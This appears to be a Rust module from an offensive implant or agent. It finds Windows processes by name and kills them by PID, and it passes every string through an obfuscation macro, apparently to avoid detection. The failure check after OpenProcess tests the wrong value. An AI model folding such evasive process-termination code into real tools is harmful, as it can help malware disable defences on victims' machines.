use anyhow::{Context, Result, bail};
use std::ffi::CStr;
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};

use crate::obfuscate;

pub async fn pid_by_name(name: &str) -> Result<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if snapshot == INVALID_HANDLE_VALUE {
            let e = format!("{}0x{:08X}", obfuscate!("[!] Failed to create process snapshot : "), GetLastError());
            bail!(e);
        }
        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            bail!(obfuscate!("[!] Failed to get first process"));
        }

        loop {
            let exe_name = CStr::from_ptr(entry.szExeFile.as_ptr()).to_string_lossy();
            if exe_name.eq_ignore_ascii_case(name) {
                let pid = entry.th32ProcessID;
                CloseHandle(snapshot);
                return Ok(pid);
            }

            if Process32Next(snapshot, &mut entry) == 0 {break}
        }

        CloseHandle(snapshot);
        let e = format!("{}{}", obfuscate!("[!]  Process not found : "), name);
        bail!(e);
    }
}

pub async fn pkill(pid: &str) -> Result<String> {
    let pid: u32 = pid.parse()?;
    let hProcess: HANDLE = unsafe {OpenProcess(PROCESS_ALL_ACCESS, 0, pid)};
    if hProcess == INVALID_HANDLE_VALUE {
        bail!(obfuscate!("Failed to get a handle to the process!"));
    };

    let result = unsafe {TerminateProcess(hProcess, 1)};
    unsafe {CloseHandle(hProcess)};
    if result == 0 {
        let e = format!("{}, Error: 0x{:08X}", obfuscate!("Failed to kill the process with pid : "), unsafe{GetLastError()});
        bail!(e);
    }

    Ok(obfuscate!("Process Killed!"))
}
